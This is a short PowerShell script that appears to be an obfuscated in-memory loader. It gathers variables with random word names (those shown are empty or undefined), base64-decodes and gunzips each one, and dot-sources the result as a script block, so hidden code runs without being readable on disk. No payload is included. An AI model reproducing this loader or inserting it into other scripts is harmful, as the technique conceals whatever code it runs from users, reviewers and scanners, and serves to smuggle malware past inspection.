$Inhumanely = ""
$Schedulers = ""
$Eggbeaters = ""
$Cyberspace = ""
$Unbosoming = ""
$Angularity = ""
$Encyclical = ""

function ConvertFrom-Gzip {
    [CmdletBinding()] param([byte[]] $Bytes)
    $is = New-Object IO.MemoryStream(, $Bytes)
    $gs = New-Object IO.Compression.GzipStream $is, ([IO.Compression.CompressionMode]::Decompress)
    $sr = New-Object IO.StreamReader($gs)
    $sbd = $sr.ReadToEnd()
    $sr.Close()
    $gs.Close()
    $is.Close()
    $sbd
}

$Modules = @($Fastenings,$Loincloths,$Chubbiness,$Underwrite,$Orthopedic,$Beefsteaks,$Strikeouts,$Privileged,$Lumberyard,$Safeguards,$Inveigling,$Cappuccino,$Rearranges,$Reportedly,$Typesetter,$Filmstrips,$Inhumanely,$Schedulers,$Eggbeaters,$Cyberspace,$Unbosoming,$Angularity,$Encyclical)
$Modules | ForEach-Object {
    $Decoded = [System.Convert]::FromBase64String($_)
    $Decompressed = ConvertFrom-Gzip -Bytes $Decoded
    $ScriptBlock = $ExecutionContext.InvokeCommand.NewScriptBlock($Decompressed)
    . $ScriptBlock
}
